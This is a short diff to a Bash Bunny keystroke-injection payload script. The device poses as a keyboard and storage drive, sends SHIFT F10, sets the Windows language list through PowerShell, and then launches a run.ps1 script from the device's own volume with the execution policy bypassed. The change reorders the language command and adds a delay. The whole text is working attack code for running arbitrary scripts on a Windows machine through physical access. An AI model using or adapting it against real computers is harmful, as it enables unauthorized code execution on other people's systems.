@@ -3,12 +3,13 @@
 LED SETUP
 ATTACKMODE HID STORAGE
 GET SWITCH_POSITION
-Q STRING "powershell.exe Set-WinUserLanguageList -LanguageList en-US -force"
 Q ENTER
 # Stage 1 - Powershell
 LED ATTACK
 Q SHIFT F10
 sleep 3
+Q STRING "powershell.exe Set-WinUserLanguageList -LanguageList en-US -force"
+sleep 1
 Q STRING powershell -executionpolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\run.ps1')"
 Q ENTER
 
